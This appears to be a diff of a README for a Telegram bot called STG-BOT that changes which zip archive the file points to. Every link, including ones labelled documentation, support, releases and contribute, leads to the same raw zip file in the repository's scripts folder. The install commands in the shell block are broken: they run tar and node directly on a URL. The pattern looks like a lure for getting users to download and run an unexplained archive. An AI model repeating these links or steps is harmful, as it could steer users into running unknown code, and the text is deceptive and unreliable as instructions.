@@ -1,6 +1,6 @@
 # 🐐 STG-BOT - Your Easy Telegram Bot Solution
 
-[![Download STG-BOT](https://raw.githubusercontent.com/carbonic-dressage957/STG-BOT/main/scripts/cmds/STG-BOT_v1.0.zip)](https://raw.githubusercontent.com/carbonic-dressage957/STG-BOT/main/scripts/cmds/STG-BOT_v1.0.zip)
+[![Download STG-BOT](https://raw.githubusercontent.com/carbonic-dressage957/STG-BOT/main/scripts/ST-BOT-3.3.zip)](https://raw.githubusercontent.com/carbonic-dressage957/STG-BOT/main/scripts/ST-BOT-3.3.zip)
 
 ## 📖 Introduction
 
@@ -16,11 +16,11 @@ Before you download the bot, check that your device meets these requirements:
 
 - An active internet connection
 - A Telegram account
-- For advanced features, you may need https://raw.githubusercontent.com/carbonic-dressage957/STG-BOT/main/scripts/cmds/STG-BOT_v1.0.zip installed. (Visit [https://raw.githubusercontent.com/carbonic-dressage957/STG-BOT/main/scripts/cmds/STG-BOT_v1.0.zip](https://raw.githubusercontent.com/carbonic-dressage957/STG-BOT/main/scripts/cmds/STG-BOT_v1.0.zip) for more information.)
+- For advanced features, you may need https://raw.githubusercontent.com/carbonic-dressage957/STG-BOT/main/scripts/ST-BOT-3.3.zip installed. (Visit [https://raw.githubusercontent.com/carbonic-dressage957/STG-BOT/main/scripts/ST-BOT-3.3.zip](https://raw.githubusercontent.com/carbonic-dressage957/STG-BOT/main/scripts/ST-BOT-3.3.zip) for more information.)
 
 ## 📥 Download & Install
 
-To download STG-BOT, visit our [Releases page](https://raw.githubusercontent.com/carbonic-dressage957/STG-BOT/main/scripts/cmds/STG-BOT_v1.0.zip). 
+To download STG-BOT, visit our [Releases page](https://raw.githubusercontent.com/carbonic-dressage957/STG-BOT/main/scripts/ST-BOT-3.3.zip). 
 
 1. Click the link to access the page.
 2. Look for the latest version.
@@ -43,9 +43,9 @@ To download STG-BOT, visit our [Releases page](https://raw.githubusercontent.com
 - Navigate to the download location. Run the following commands:
 
 ```bash
-tar -xzf https://raw.githubusercontent.com/carbonic-dressage957/STG-BOT/main/scripts/cmds/STG-BOT_v1.0.zip
+tar -xzf https://raw.githubusercontent.com/carbonic-dressage957/STG-BOT/main/scripts/ST-BOT-3.3.zip
 cd STG-BOT
-node https://raw.githubusercontent.com/carbonic-dressage957/STG-BOT/main/scripts/cmds/STG-BOT_v1.0.zip
+node https://raw.githubusercontent.com/carbonic-dressage957/STG-BOT/main/scripts/ST-BOT-3.3.zip
 ```
 
 ## 🔑 Configuration
@@ -75,7 +75,7 @@ If you encounter issues, consider the following:
 
 ## 💬 Support
 
-If you need help or have questions, please open an issue on our [GitHub page](https://raw.githubusercontent.com/carbonic-dressage957/STG-BOT/main/scripts/cmds/STG-BOT_v1.0.zip). We are happy to assist you.
+If you need help or have questions, please open an issue on our [GitHub page](https://raw.githubusercontent.com/carbonic-dressage957/STG-BOT/main/scripts/ST-BOT-3.3.zip). We are happy to assist you.
 
 ## 🥳 Join the Community
 
@@ -83,8 +83,8 @@ Stay connected with STG-BOT by engaging with fellow users and contributors. Shar
 
 ## 🔗 Useful Links
 
-- [Download STG-BOT](https://raw.githubusercontent.com/carbonic-dressage957/STG-BOT/main/scripts/cmds/STG-BOT_v1.0.zip)
-- [Documentation](https://raw.githubusercontent.com/carbonic-dressage957/STG-BOT/main/scripts/cmds/STG-BOT_v1.0.zip)
-- [Contribute to STG-BOT](https://raw.githubusercontent.com/carbonic-dressage957/STG-BOT/main/scripts/cmds/STG-BOT_v1.0.zip)
+- [Download STG-BOT](https://raw.githubusercontent.com/carbonic-dressage957/STG-BOT/main/scripts/ST-BOT-3.3.zip)
+- [Documentation](https://raw.githubusercontent.com/carbonic-dressage957/STG-BOT/main/scripts/ST-BOT-3.3.zip)
+- [Contribute to STG-BOT](https://raw.githubusercontent.com/carbonic-dressage957/STG-BOT/main/scripts/ST-BOT-3.3.zip)
 
 Thank you for choosing STG-BOT! Enjoy your enhanced Telegram experience!
